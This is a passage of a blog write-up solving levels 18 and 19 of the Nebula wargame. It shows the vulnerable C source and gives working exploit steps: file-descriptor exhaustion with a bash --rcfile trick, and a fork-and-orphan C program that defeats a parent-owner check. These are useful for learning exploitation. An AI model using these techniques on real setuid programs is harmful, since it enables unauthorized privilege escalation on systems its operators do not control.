+  <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;%s</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">msg);</span>
+
+<span style="color: #f8f8f2">}</span>
+
+<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">envp)</span>
+<span style="color: #f8f8f2">{</span>
+  <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">c;</span>
+
+  <span style="color: #66d9ef">while</span><span style="color: #f8f8f2">((c</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">getopt(argc,</span> <span style="color: #f8f8f2">argv,</span> <span style="color: #e6db74">&quot;d:v&quot;</span><span style="color: #f8f8f2">))</span> <span style="color: #f92672">!=</span> <span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
+    <span style="color: #66d9ef">switch</span><span style="color: #f8f8f2">(c)</span> <span style="color: #f8f8f2">{</span>
+      <span style="color: #66d9ef">case</span> <span style="color: #e6db74">&#39;d&#39;</span><span style="color: #f92672">:</span>
+        <span style="color: #f8f8f2">globals.debugfile</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">fopen(optarg,</span> <span style="color: #e6db74">&quot;w+&quot;</span><span style="color: #f8f8f2">);</span>
+        <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(globals.debugfile</span> <span style="color: #f92672">==</span> <span style="color: #f8f8f2">NULL)</span> <span style="color: #f8f8f2">err(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;Unable to open %s&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">optarg);</span>
+        <span style="color: #f8f8f2">setvbuf(globals.debugfile,</span> <span style="color: #f8f8f2">NULL,</span> <span style="color: #f8f8f2">_IONBF,</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">);</span>
+        <span style="color: #66d9ef">break</span><span style="color: #f8f8f2">;</span>
+      <span style="color: #66d9ef">case</span> <span style="color: #e6db74">&#39;v&#39;</span><span style="color: #f92672">:</span>
+        <span style="color: #f8f8f2">globals.verbose</span><span style="color: #f92672">++</span><span style="color: #f8f8f2">;</span>
+        <span style="color: #66d9ef">break</span><span style="color: #f8f8f2">;</span>
+    <span style="color: #f8f8f2">}</span>
+  <span style="color: #f8f8f2">}</span>
+
+  <span style="color: #f8f8f2">dprintf(</span><span style="color: #e6db74">&quot;Starting up. Verbose level = %d</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">globals.verbose);</span>
+
+  <span style="color: #f8f8f2">setresgid(getegid(),</span> <span style="color: #f8f8f2">getegid(),</span> <span style="color: #f8f8f2">getegid());</span>
+  <span style="color: #f8f8f2">setresuid(geteuid(),</span> <span style="color: #f8f8f2">geteuid(),</span> <span style="color: #f8f8f2">geteuid());</span>
+  
+  <span style="color: #66d9ef">while</span><span style="color: #f8f8f2">(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
+    <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">line[</span><span style="color: #ae81ff">256</span><span style="color: #f8f8f2">];</span>
+    <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">p,</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">q;</span>
+
+    <span style="color: #f8f8f2">q</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">fgets(line,</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(line)</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">stdin);</span>
+    <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(q</span> <span style="color: #f92672">==</span> <span style="color: #f8f8f2">NULL)</span> <span style="color: #66d9ef">break</span><span style="color: #f8f8f2">;</span>
+    <span style="color: #f8f8f2">p</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">strchr(line,</span> <span style="color: #e6db74">&#39;\n&#39;</span><span style="color: #f8f8f2">);</span> <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(p)</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">p</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>
+    <span style="color: #f8f8f2">p</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">strchr(line,</span> <span style="color: #e6db74">&#39;\r&#39;</span><span style="color: #f8f8f2">);</span> <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(p)</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">p</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>
+
+    <span style="color: #f8f8f2">dvprintf(</span><span style="color: #ae81ff">2</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;got [%s] as input</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">line);</span>
+
+    <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(strncmp(line,</span> <span style="color: #e6db74">&quot;login&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">5</span><span style="color: #f8f8f2">)</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
+      <span style="color: #f8f8f2">dvprintf(</span><span style="color: #ae81ff">3</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;attempting to login</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
+      <span style="color: #f8f8f2">login(line</span> <span style="color: #f92672">+</span> <span style="color: #ae81ff">6</span><span style="color: #f8f8f2">);</span>
+    <span style="color: #f8f8f2">}</span> <span style="color: #66d9ef">else</span> <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(strncmp(line,</span> <span style="color: #e6db74">&quot;logout&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">6</span><span style="color: #f8f8f2">)</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
+      <span style="color: #f8f8f2">globals.loggedin</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>
+    <span style="color: #f8f8f2">}</span> <span style="color: #66d9ef">else</span> <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(strncmp(line,</span> <span style="color: #e6db74">&quot;shell&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">5</span><span style="color: #f8f8f2">)</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
+      <span style="color: #f8f8f2">dvprintf(</span><span style="color: #ae81ff">3</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;attempting to start shell</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
+      <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(globals.loggedin)</span> <span style="color: #f8f8f2">{</span>
+        <span style="color: #f8f8f2">execve(</span><span style="color: #e6db74">&quot;/bin/sh&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">argv,</span> <span style="color: #f8f8f2">envp);</span>
+        <span style="color: #f8f8f2">err(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;unable to execve&quot;</span><span style="color: #f8f8f2">);</span>
+      <span style="color: #f8f8f2">}</span>
+      <span style="color: #f8f8f2">dprintf(</span><span style="color: #e6db74">&quot;Permission denied</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
+    <span style="color: #f8f8f2">}</span> <span style="color: #66d9ef">else</span> <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(strncmp(line,</span> <span style="color: #e6db74">&quot;logout&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">4</span><span style="color: #f8f8f2">)</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
+      <span style="color: #f8f8f2">globals.loggedin</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>
+    <span style="color: #f8f8f2">}</span> <span style="color: #66d9ef">else</span> <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(strncmp(line,</span> <span style="color: #e6db74">&quot;closelog&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">8</span><span style="color: #f8f8f2">)</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
+      <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(globals.debugfile)</span> <span style="color: #f8f8f2">fclose(globals.debugfile);</span>
+      <span style="color: #f8f8f2">globals.debugfile</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">NULL;</span>
+    <span style="color: #f8f8f2">}</span> <span style="color: #66d9ef">else</span> <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(strncmp(line,</span> <span style="color: #e6db74">&quot;site exec&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">9</span><span style="color: #f8f8f2">)</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
+      <span style="color: #f8f8f2">notsupported(line</span> <span style="color: #f92672">+</span> <span style="color: #ae81ff">10</span><span style="color: #f8f8f2">);</span>
+    <span style="color: #f8f8f2">}</span> <span style="color: #66d9ef">else</span> <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(strncmp(line,</span> <span style="color: #e6db74">&quot;setuser&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">7</span><span style="color: #f8f8f2">)</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
+      <span style="color: #f8f8f2">setuser(line</span> <span style="color: #f92672">+</span> <span style="color: #ae81ff">8</span><span style="color: #f8f8f2">);</span>
+    <span style="color: #f8f8f2">}</span>
+  <span style="color: #f8f8f2">}</span>
+
+  <span style="color: #66d9ef">return</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>
+<span style="color: #f8f8f2">}</span>
+</pre></div>
+</p>
+
+<p>This is quite a lot a of code, but let&rsquo;s see what it does. The program accepts
+two arguments <code>-v</code> and <code>-d</code> which increase verbosity level and set a debug file
+respectively. If you launch it with <code>flag18 -v -v -v -d /tmp/debug</code> and then
+<code>tail -f /tmp/debug</code> you can see what&rsquo;s going on. I used 3 <code>-v</code> because that&rsquo;s
+the max debug level to be sure to capture everything.</p>
+
+<p>Once it&rsquo;s running there&rsquo;s a number of commands we can issue. These are probably
+going to give us something to poke around with. We can try to get a shell with
+the <em>shell</em> command, but that means we need to be logged in. I&rsquo;ll make a
+note of that. The <code>setuser</code> function has a fixed sized buffer. Let&rsquo;s try to
+overflow that</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level18@nebula:/home/flag18$ python -c <span style="color: #e6db74">&quot;print(&#39;setuser &#39; + &#39;A&#39;*128)&quot;</span> <span style="color: #f8f8f2">|</span> ./flag18 -v -v -v -d /tmp/flag18/debug
+*** buffer overflow detected ***: ./flag18 terminated
+======= Backtrace: =========
+/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x45)[0x6998d5]
+/lib/i386-linux-gnu/libc.so.6(+0xe66d7)[0x6986d7]
+/lib/i386-linux-gnu/libc.so.6(+0xe5d35)[0x697d35]
+/lib/i386-linux-gnu/libc.so.6(_IO_default_xsputn+0x91)[0x61df91]
+/lib/i386-linux-gnu/libc.so.6(_IO_vfprintf+0x31d5)[0x5f5305]
+/lib/i386-linux-gnu/libc.so.6(__vsprintf_chk+0xc9)[0x697e09]
+/lib/i386-linux-gnu/libc.so.6(__sprintf_chk+0x2f)[0x697d1f]
+./flag18[0x8048df5]
+./flag18[0x8048b1b]
+/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0x5cb113]
+./flag18[0x8048bb1]
+======= Memory map: ========
+005b2000-00728000 r-xp 00000000 07:00 44973      /lib/i386-linux-gnu/libc-2.13.so
+00728000-0072a000 r--p 00176000 07:00 44973      /lib/i386-linux-gnu/libc-2.13.so
+0072a000-0072b000 rw-p 00178000 07:00 44973      /lib/i386-linux-gnu/libc-2.13.so
+0072b000-0072e000 rw-p 00000000 00:00 0
+0079b000-007b9000 r-xp 00000000 07:00 44978      /lib/i386-linux-gnu/ld-2.13.so
+007b9000-007ba000 r--p 0001d000 07:00 44978      /lib/i386-linux-gnu/ld-2.13.so
+007ba000-007bb000 rw-p 0001e000 07:00 44978      /lib/i386-linux-gnu/ld-2.13.so
+007fd000-007fe000 r-xp 00000000 00:00 0          [vdso]
+00886000-008a2000 r-xp 00000000 07:00 45092      /lib/i386-linux-gnu/libgcc_s.so.1
+008a2000-008a3000 r--p 0001b000 07:00 45092      /lib/i386-linux-gnu/libgcc_s.so.1
+008a3000-008a4000 rw-p 0001c000 07:00 45092      /lib/i386-linux-gnu/libgcc_s.so.1
+08048000-0804a000 r-xp 00000000 07:00 12922      /home/flag18/flag18
+0804a000-0804b000 r--p 00001000 07:00 12922      /home/flag18/flag18
+0804b000-0804c000 rw-p 00002000 07:00 12922      /home/flag18/flag18
+099f9000-09a1a000 rw-p 00000000 00:00 0          [heap]
+b7832000-b7833000 rw-p 00000000 00:00 0
+b783b000-b783e000 rw-p 00000000 00:00 0
+bf8bf000-bf8e0000 rw-p 00000000 00:00 0          [stack]
+Aborted
+</pre></div>
+</p>
+
+<p>This led me to learn about <a href="https://en.wikipedia.org/wiki/Stack_canary#Stack_canaries">stack canaries</a>, and with this we&rsquo;re out of luck
+(for a simple solution). This means the code has been compiled with
+<em>FORTIFY_SOURCE</em> and this also going to prevent string formatting exploits in
+the <code>notsupported</code> function.</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level18@nebula:/home/flag18$ ./flag18 -v -v -v -d /tmp/flag18/debug
+site exec %n
+*** %n in writable segment detected ***
+Aborted
+</pre></div>
+</p>
+
+<p>Yup. In the process of researching this I also discovered a neat tool called
+<a href="http://trapkit.de/tools/checksec.html">checksec.sh</a> that can help identify these compiler options early on.</p>
+
+<p>So what have we got left? The function that checks the password file. If it&rsquo;s
+not actually able to find the password file, it will log us in. Unfortunately
+we&rsquo;re not able to delete it. However we can make the <code>fopen</code> call fail another
+way. This error has happened a lot at work where we often deal with a lot of
+files being open on a single system. Linux systems have a limit as to how
+many filedescriptors it can have open at any one time. Because
+the tool doesn&rsquo;t close the file descriptors until you call <code>closelog</code>,
+we can just keep opening files until we hit the limit. Let&rsquo;s see what that
+limit is.</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level18@nebula:/home/flag18$ <span style="color: #f8f8f2">ulimit</span> -a
+core file size          (blocks, -c) 0
+data seg size           (kbytes, -d) unlimited
+scheduling priority             (-e) 0
+file size               (blocks, -f) unlimited
+pending signals                 (-i) 1817
+max locked memory       (kbytes, -l) 64
+max memory size         (kbytes, -m) unlimited
+open files                      (-n) 1024
+pipe size            (512 bytes, -p) 8
+POSIX message queues     (bytes, -q) 819200
+real-time priority              (-r) 0
+stack size              (kbytes, -s) 8192
+cpu time               (seconds, -t) unlimited
+max user processes              (-u) 1817
+virtual memory          (kbytes, -v) unlimited
+file locks                      (-x) unlimited
+</pre></div>
+</p>
+
+<p><em>1024</em> is the limit. So let&rsquo;s open 1024 files and see what happens. As we have
+a few file descriptors open already we just need to open 1021 more.</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level18@nebula:/home/flag18$ python -c <span style="color: #e6db74">&quot;print(&#39;login me\n&#39;*1021 + &#39;shell&#39;)&quot;</span> <span style="color: #f8f8f2">|</span> ./flag18 -v -d /tmp/flag18/debug
+./flag18: error while loading shared libraries: libncurses.so.5: cannot open shared object file: Error 24
+</pre></div>
+</p>
+
+<p>Ah, so many file descriptors we can&rsquo;t open any more, not even to shared libraries.
+We can close one and see how that goes.</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level18@nebula:/home/flag18$ python -c <span style="color: #e6db74">&quot;print(&#39;login me\n&#39;*1021 + &#39;closelog\n&#39; + &#39;shell&#39;)&quot;</span> <span style="color: #f8f8f2">|</span> ./flag18 -v -d /tmp/flag18/debug
+./flag18: -d: invalid option
+Usage:	./flag18 [GNU long option] [option] ...
+	./flag18 [GNU long option] [option] script-file ...
+GNU long options:
+	--debug
+	--debugger
+	--dump-po-strings
+	--dump-strings
+	--help
+	--init-file
+	--login
+	--noediting
+	--noprofile
+	--norc
+	--posix
+	--protected
+	--rcfile
+	--restricted
+	--verbose
+	--version
+Shell options:
+	-irsD or -c command or -O shopt_option		(invocation only)
+	-abefhkmnptuvxBCHP or -o option
+</pre></div>
+</p>
+
+<p>Right, so we need to remember that we&rsquo;re running <code>sh</code> here, and our arguments
+are being passed to it. Unfortunately <code>-d</code> and such are not valid here.
+Time to read the manual&hellip;.</p>
+
+<blockquote>
+<p><strong>&ndash;rcfile file</strong></p>
+
+<p>Execute commands from file instead of the system wide
+initialization file /etc/bash.bashrc and the standard personal
+initialization file ~/.bashrc if the shell is interactive
+(see INVOCATION below).</p>
+</blockquote>
+
+<p>Ok, well, it&rsquo;s worth a shot.</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level18@nebula:/home/flag18$ python -c <span style="color: #e6db74">&quot;print(&#39;login me\n&#39;*1021 + &#39;closelog\n&#39; + &#39;shell&#39;)&quot;</span> <span style="color: #f8f8f2">|</span> ./flag18 --rcfile -d /tmp/flag18/debug
+./flag18: invalid option -- &#39;-&#39;
+./flag18: invalid option -- &#39;r&#39;
+./flag18: invalid option -- &#39;c&#39;
+./flag18: invalid option -- &#39;f&#39;
+./flag18: invalid option -- &#39;i&#39;
+./flag18: invalid option -- &#39;l&#39;
+./flag18: invalid option -- &#39;e&#39;
+/tmp/flag18/debug: line 1: Starting: command not found
+/tmp/flag18/debug: line 2: syntax error near unexpected token `(&#39;
+/tmp/flag18/debug: line 2: `logged in successfully (without password file)&#39;
+</pre></div>
+</p>
+
+<p>Heavens, it worked - sort of. Notice the <em>/tmp/flag18/debug: line 1: Starting: command not found</em>? That&rsquo;s because our <em>rcfile</em> is set to be our debug file. So
+it writes to the debug file and then the shell will try to execute it. As we know
+the first line in the file is <em>Starting up. Verbose level = 1</em>, so all we really
+need to do to quash that error we need to create an executable with that name.
+Inside that we will run out beloved <code>getflag</code></p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level18@nebula:/home/flag18$ <span style="color: #f8f8f2">echo </span>getflag &gt; /tmp/Starting
+level18@nebula:/home/flag18$ chmod +x !<span style="color: #960050; background-color: #1e0010">$</span>
+chmod +x /tmp/Starting
+level18@nebula:/home/flag18$ <span style="color: #f8f8f2">export PATH</span><span style="color: #f92672">=</span><span style="color: #e6db74">${</span><span style="color: #f8f8f2">PATH</span><span style="color: #e6db74">}</span>:/tmp
+level18@nebula:/home/flag18$ python -c <span style="color: #e6db74">&quot;print(&#39;login me\n&#39;*1021 + &#39;closelog\n&#39; + &#39;shell&#39;)&quot;</span> <span style="color: #f8f8f2">|</span> ./flag18 --rcfile -d /tmp/flag18/debug
+./flag18: invalid option -- &#39;-&#39;
+./flag18: invalid option -- &#39;r&#39;
+./flag18: invalid option -- &#39;c&#39;
+./flag18: invalid option -- &#39;f&#39;
+./flag18: invalid option -- &#39;i&#39;
+./flag18: invalid option -- &#39;l&#39;
+./flag18: invalid option -- &#39;e&#39;
+You have successfully executed getflag on a target account
+/tmp/flag18/debug: line 2: syntax error near unexpected token `(&#39;
+/tmp/flag18/debug: line 2: `logged in successfully (without password file)&#39;
+</pre></div>
+</p>
+
+<p>The harder ways are beyond what I can do, but for those interested in
+circumventing <code>FORTIFY_SOURCE</code> you can read <a href="http://phrack.org/issues/67/9.html">A Eulogy for Formatting Strings</a>. I&rsquo;ll be re-reading that for sure.</p>
+
+<h2 id="flag-19:eaf9fabfe6e85567a2c1f06adf83e2d8">Flag 19</h2>
+
+<blockquote>
+<p>There is a flaw in the below program in how it operates.</p>
+</blockquote>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;stdlib.h&gt;</span>
+<span style="color: #75715e">#include &lt;unistd.h&gt;</span>
+<span style="color: #75715e">#include &lt;string.h&gt;</span>
+<span style="color: #75715e">#include &lt;sys/types.h&gt;</span>
+<span style="color: #75715e">#include &lt;stdio.h&gt;</span>
+<span style="color: #75715e">#include &lt;fcntl.h&gt;</span>
+<span style="color: #75715e">#include &lt;sys/stat.h&gt;</span>
+
+<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">envp)</span>
+<span style="color: #f8f8f2">{</span>
+  <span style="color: #66d9ef">pid_t</span> <span style="color: #f8f8f2">pid;</span>
+  <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">buf[</span><span style="color: #ae81ff">256</span><span style="color: #f8f8f2">];</span>
+  <span style="color: #66d9ef">struct</span> <span style="color: #f8f8f2">stat</span> <span style="color: #f8f8f2">statbuf;</span>
+
+  <span style="color: #75715e">/* Get the parent&#39;s /proc entry, so we can verify its user id */</span>
+
+  <span style="color: #f8f8f2">snprintf(buf,</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(buf)</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;/proc/%d&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">getppid());</span>
+
+  <span style="color: #75715e">/* stat() it */</span>
+
+  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(stat(buf,</span> <span style="color: #f92672">&amp;</span><span style="color: #f8f8f2">statbuf)</span> <span style="color: #f92672">==</span> <span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
+    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Unable to check parent process</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
+    <span style="color: #f8f8f2">exit(EXIT_FAILURE);</span>
+  <span style="color: #f8f8f2">}</span>
+
+  <span style="color: #75715e">/* check the owner id */</span>
+
+  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(statbuf.st_uid</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
+    <span style="color: #75715e">/* If root started us, it is ok to start the shell */</span>
+
+    <span style="color: #f8f8f2">execve(</span><span style="color: #e6db74">&quot;/bin/sh&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">argv,</span> <span style="color: #f8f8f2">envp);</span>
+    <span style="color: #f8f8f2">err(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;Unable to execve&quot;</span><span style="color: #f8f8f2">);</span>
+  <span style="color: #f8f8f2">}</span>
+
+  <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;You are unauthorized to run this program</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
+<span style="color: #f8f8f2">}</span>
+</pre></div>
+</p>
+
+<p>So we can get the shell we want if we can run this as root. How can we do that?
+This exploits involves a knowledge of Linux forks. Basically if a process
+forks and the parent dies, the child will automatically be run under <code>init</code>.
+This is called <a href="http://wiki.linuxquestions.org/wiki/Fork_off_and_die">Fork off and die</a>. So who does <code>init</code> run as?</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level19@nebula:/tmp/flag19$ ps aux <span style="color: #f8f8f2">|</span> grep init
+root         1  0.0  0.6   3196  1512 ?        Ss   00:32   0:00 /sbin/init
+</pre></div>
+</p>
+
+<p>In order to make use of this we need to run <code>flag18</code> as a forked process and
+then kill the parent. The arguments to <code>flag18</code> are passed onto the shell
+it executes, and thus we can make use of this. I&rsquo;ll write some C code
+to fork the <code>flag18</code> process to which we will pass the <code>getflag</code>. It should
+work.</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;unistd.h&gt;</span>
+
+<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">envp)</span> <span style="color: #f8f8f2">{</span>
+    <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">childPID</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">fork();</span>
+    <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(childPID</span> <span style="color: #f92672">&gt;=</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span> <span style="color: #75715e">// forked</span>
+        <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(childPID</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span> <span style="color: #75715e">// child</span>
+            <span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">);</span>
+            <span style="color: #f8f8f2">setresuid(geteuid(),geteuid(),geteuid());</span>
+            <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">args[]</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">{</span><span style="color: #e6db74">&quot;/bin/sh&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;-c&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;/bin/getflag&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">NULL};</span>
+            <span style="color: #f8f8f2">execve(</span><span style="color: #e6db74">&quot;/home/flag19/flag19&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">args,</span> <span style="color: #f8f8f2">envp);</span>
+        <span style="color: #f8f8f2">}</span>
+    <span style="color: #f8f8f2">}</span>
+    <span style="color: #66d9ef">return</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>
+<span style="color: #f8f8f2">}</span>
+</pre></div>
+</p>
+
+<p>Get the idea? Right, let&rsquo;s taste this pudding</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level19@nebula:/tmp/flag19$ gcc forkit.c -o forkit
+level19@nebula:/tmp/flag19$ ./forkit
+level19@nebula:/tmp/flag19$ You have successfully executed getflag on a target account
+</pre></div>
+</p>
+
+<p><strong>Nebula done.</strong></p>
+
+<h2 id="closing-words:eaf9fabfe6e85567a2c1f06adf83e2d8">Closing words</h2>
+
+<p>Firstly: Thanks for taking the time to read this. Please leave any feedback or
+comments below (or twitter/email if you prefer).</p>
+
+<p>Secondly: If you are here because you are also playing <em>Nebula</em> and are
+new to this like I am, this write up might seem like magic.
+You&rsquo;re struggling to figure out how to get past a certain
+level and then this text makes it seem like magic.</p>
+
+<p>It&rsquo;s not like that. I spent a lot of time working through the later levels as I
+quickly learned how little I knew. Much time was spent researching and learning
+about things I thought I already knew. Turns out I knew very little about them.
+There were a lot of failures on the way, but if I kept those in, this post
+would be much much longer. The thought process seems very simple in write ups,
+but trust me, there&rsquo;s quite a bit of puzzling and thinking to do.</p>
+
+<p>It&rsquo;s early days for me too, and I very much enjoyed <em>Nebula</em>, and have a whole
+new set of tools and ideas in my arsenal for the next challenge.</p>
+
+            <ul class="share-buttons">
+    <li></li>
+    <li>
+        <a class="icon-facebook-squared" href="https://www.facebook.com/sharer/sharer.php?u=http%3a%2f%2funlogic.co.uk%2f2014%2f07%2f02%2fcracking-nebula-part2%2f" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;" title=""></a>
+    </li>
+    <li>
+        <a class="icon-twitter" href="https://twitter.com/share?text=Cracking%20Nebula%20Part%202&amp;url=http%3a%2f%2funlogic.co.uk%2f2014%2f07%2f02%2fcracking-nebula-part2%2f" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;" title=""></a>
+    </li>
+    <li>
